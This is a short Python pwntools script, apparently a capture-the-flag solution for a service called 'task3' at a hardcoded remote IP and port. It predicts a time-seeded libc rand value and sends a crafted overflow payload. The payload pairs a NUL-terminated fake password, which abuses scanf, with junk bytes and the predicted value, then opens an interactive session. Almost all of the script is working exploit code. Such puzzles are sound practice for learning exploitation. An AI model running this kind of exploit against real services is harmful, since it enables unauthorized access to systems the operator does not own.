from pwn import *
import json

from ctypes import *
libc = CDLL("libc.so.6")
libc.srand(libc.time(0))

rnd = libc.rand()
print(type(rnd))
print(hex(rnd))
print(rnd.to_bytes(4, 'little'))
print(rnd.to_bytes(4, 'big'))

def try_connection(input_buffer):
    # io = process("./task3")
    io = remote('45.76.91.112', 10053)
    io.recvuntil(b'Enter password:')

    io.sendline(input_buffer)

    # output = io.recvallS()
    # output = io.recvrepeat().decode('utf-8')
    io.interactive(); output = ''

    # print(output)

    # io.close()

    return output

def find_canary():
    junk_length = 44
    desired_pass_length = 8
    trick_password = 'a' * desired_pass_length + '\x00' # scanf doesn't stop at '\0' (because it's not considered whitespace)
    junk = bytes(trick_password + 'a' * (junk_length - len(trick_password)), 'utf-8')
    result_map = {}

    # # for byte_integer in range(256):
    # for byte_integer in [32]:
    #     input_buffer = junk + byte_integer.to_bytes(1, 'big')
    #     output = try_connection(input_buffer)
    #     result_map.setdefault(output, []).append(byte_integer)

    input_buffer = junk + rnd.to_bytes(4, 'little')
    # input_buffer = junk + rnd.to_bytes(4, 'big')
    output = try_connection(input_buffer)
    result_map.setdefault(output, []).append(rnd)

    result_map = json.dumps(result_map)
    print(result_map)

    with open('resultRemote.txt', 'w') as f:
        f.write(result_map)


find_canary()
